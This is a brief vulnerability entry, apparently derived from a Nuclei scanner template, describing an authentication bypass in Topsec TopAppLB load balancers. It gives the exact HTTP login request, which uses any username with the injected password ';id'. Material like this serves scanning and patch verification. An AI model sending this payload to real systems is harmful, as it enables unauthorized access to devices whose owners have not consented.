# Vulnerability: Topsec TopAppLB - Authentication Bypass
**Classification:** TOPSEC
**Source:** Nuclei Template (`topsec-topapplb-auth-bypass.yaml`)

## Description
Topsec TopAppLB is vulnerable to authetication bypass .Enter any account on the login page, the password is `;id`.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login_check.php  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userName=admin&password=%3Bid

GET / HTTP/1.1
Host: {{Hostname}}
```

